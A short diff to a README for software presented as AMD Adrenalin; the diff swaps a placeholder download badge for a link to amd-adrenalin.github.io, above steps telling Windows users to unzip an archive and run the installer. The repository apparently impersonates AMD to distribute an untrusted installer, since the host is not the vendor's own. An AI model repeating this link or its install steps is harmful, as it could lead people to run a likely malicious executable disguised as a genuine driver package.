@@ -8,7 +8,7 @@ With features like **Radeon Boost, Chill, ReLive, and Anti-Lag**, Adrenalin help
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](https://amd-adrenalin.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **AMD Adrenalin Installer** on your Windows PC.  
